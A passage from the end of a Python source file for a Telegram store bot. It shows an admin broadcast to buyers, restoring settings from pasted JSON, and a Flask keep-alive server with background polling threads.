                            bot.send_message(b["user_id"], message.text, parse_mode="Markdown")
                        elif message.content_type == 'photo':
                            bot.send_photo(b["user_id"], message.photo[-1].file_id, caption=message.caption, parse_mode="Markdown")
                        elif message.content_type == 'video':
                            bot.send_video(b["user_id"], message.video.file_id, caption=message.caption, parse_mode="Markdown")
                        elif message.content_type == 'document':
                            bot.send_document(b["user_id"], message.document.file_id, caption=message.caption, parse_mode="Markdown")
                        ok += 1
                    except Exception: fail += 1
                update_admin_panel(uid, f"✅ Buyers broadcast done\nSent: {ok} | Failed: {fail}", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Main", callback_data="adm_back_panel"))); return

        if state == "WAITING_RESTORE_CODE" and message.text:
            try:
                DB_STATE.update(json.loads(message.text)); save_db(); user_states.pop(uid, None)
                update_admin_panel(uid, "✅ Settings restored.", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Main", callback_data="adm_back_panel")))
            except Exception as e:
                update_admin_panel(uid, f"❌ Invalid JSON: {e}", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="adm_backup_menu"))); return

# ============ WEB + BOOT ============
@app.route('/')
def home():
    return "Multi-Admin Telegram Store Bot is running!"

def run_bot():
    bot.infinity_polling()

if __name__ == "__main__":
    threading.Thread(target=run_bot, daemon=True).start()
    threading.Thread(target=auto_broadcast_worker, daemon=True).start()
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
